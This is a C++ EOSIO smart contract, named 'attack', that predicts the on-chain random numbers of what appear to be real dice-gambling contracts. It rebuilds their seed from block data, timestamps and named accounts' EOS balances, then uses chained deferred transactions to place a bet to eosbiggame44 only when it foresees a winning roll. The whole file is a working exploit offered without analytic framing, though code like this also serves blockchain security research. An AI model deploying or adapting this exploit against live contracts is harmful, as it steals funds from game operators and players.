#include <utility>
#include <vector>
#include <string>
#include <eosiolib/eosio.hpp>
#include <eosiolib/time.hpp>
#include <eosiolib/asset.hpp>
#include <eosiolib/contract.hpp>
#include <eosiolib/types.hpp>
#include <eosiolib/transaction.hpp>
#include <eosiolib/crypto.h>
#include <boost/algorithm/string.hpp>
#include "eosio.token.hpp"

#define EOS_SYMBOL S(4, EOS)

using eosio::asset;
using eosio::permission_level;
using eosio::action;
using eosio::print;
using eosio::name;
using eosio::unpack_action_data;
using eosio::symbol_type;
using eosio::transaction;
using eosio::time_point_sec;


class attack : public eosio::contract {
    public: 
        uint64_t id = 66;
        attack(account_name self):eosio::contract(self)
        {}

        uint8_t random(account_name name, uint64_t game_id, uint64_t add)
        {
            auto eos_token = eosio::token(N(eosio.token));
            asset pool_eos = eos_token.get_balance(N(eosbocai2222), symbol_type(S(4, EOS)).name());
            asset ram_eos = eos_token.get_balance(N(eosio.ram), symbol_type(S(4, EOS)).name());
            asset betdiceadmin_eos = eos_token.get_balance(N(betdiceadmin), symbol_type(S(4, EOS)).name());
            asset newdexpocket_eos = eos_token.get_balance(N(newdexpocket), symbol_type(S(4, EOS)).name());
            asset chintailease_eos = eos_token.get_balance(N(chintailease), symbol_type(S(4, EOS)).name());
            asset eosbiggame44_eos = eos_token.get_balance(N(eosbiggame44), symbol_type(S(4, EOS)).name());
            asset total_eos = asset(0, EOS_SYMBOL);

            total_eos = pool_eos + ram_eos + betdiceadmin_eos + newdexpocket_eos + chintailease_eos + eosbiggame44_eos;
            auto amount = total_eos.amount + add;
            auto mixd = tapos_block_prefix() * tapos_block_num() + name + game_id - current_time() + amount;
            print("[ATTACK RANDOM]tapos_block_prefix=>",(uint64_t)tapos_block_prefix(),"|tapos_block_num=>",(uint64_t)tapos_block_num(),"|name=>",name,"|game_id=>",game_id,"|current_time=>",current_time(),"|total=>",amount,"\n");
        
            const char *mixedChar = reinterpret_cast<const char *>(&mixd);

            checksum256 result;
            sha256((char *)mixedChar, sizeof(mixedChar), &result);

            uint64_t random_num = *(uint64_t *)(&result.hash[0]) + *(uint64_t *)(&result.hash[8]) + *(uint64_t *)(&result.hash[16]) + *(uint64_t *)(&result.hash[24]);
            return (uint8_t)(random_num % 100 + 1);
        }

        //@abi action
        void transfer(account_name from,account_name to,asset quantity,std::string memo)
        {
            if (from == N(eosbocai2222))
            {
                return;
            }
            transaction txn{};
            txn.actions.emplace_back(
                action(eosio::permission_level(_self, N(active)),
                    _self,
                    N(reveal1),
                    std::make_tuple(id)
                )
            );
            txn.delay_sec = 2;
            txn.send(now(), _self, false);

            print("[ATTACK] current_time => ", current_time(), "\n");
        }

        //@abi action
        void reveal1(uint64_t id)
        {
            transaction txn{};
            txn.actions.emplace_back(
                action(eosio::permission_level(_self, N(active)),
                    _self,
                    N(reveal2),
                    std::make_tuple(id)
                )
            );
            txn.delay_sec = 2;
            txn.send(now(), _self, false);
            print("[ATTACK REVEAL1] current_time => ", current_time(), "\n");
        }

        //@abi action
        void reveal2(uint64_t id)
        {
            std::string memo = "noneage";
            print("[ATTACK REVEAL2] current_time => ", current_time(), "\n");
        
            for(int i=0;i<=100;i++)
            {
                uint8_t r = random(_self, 87, i);
                if((uint64_t)r < 6)
                {
                    print("[PREDICT RANDOM] random = ", (uint64_t)r, "\n");
                    if(i > 0)
                    {
                        action(permission_level(_self, N(active)),
                            N(eosio.token),
                            N(transfer),
                            std::make_tuple(_self, N(eosbiggame44), asset(i, EOS_SYMBOL), memo))
                        .send();
                    }
                    break;
                }
            } 
        }   
};

#define EOSIO_ABI_EX( TYPE, MEMBERS ) \
extern "C" { \
   void apply( uint64_t receiver, uint64_t code, uint64_t action ) { \
      auto self = receiver; \
      if( code == self || code == N(eosio.token)) { \
         if( action == N(transfer)){ \
                eosio_assert( code == N(eosio.token), "Must transfer EOS"); \
         } \
         TYPE thiscontract( self ); \
         switch( action ) { \
            EOSIO_API( TYPE, MEMBERS ) \
         } \
         /* does not allow destructor of thiscontract to run: eosio_exit(0); */ \
      } \
   } \
}

EOSIO_ABI_EX( attack,
        (transfer)(reveal1)(reveal2)
)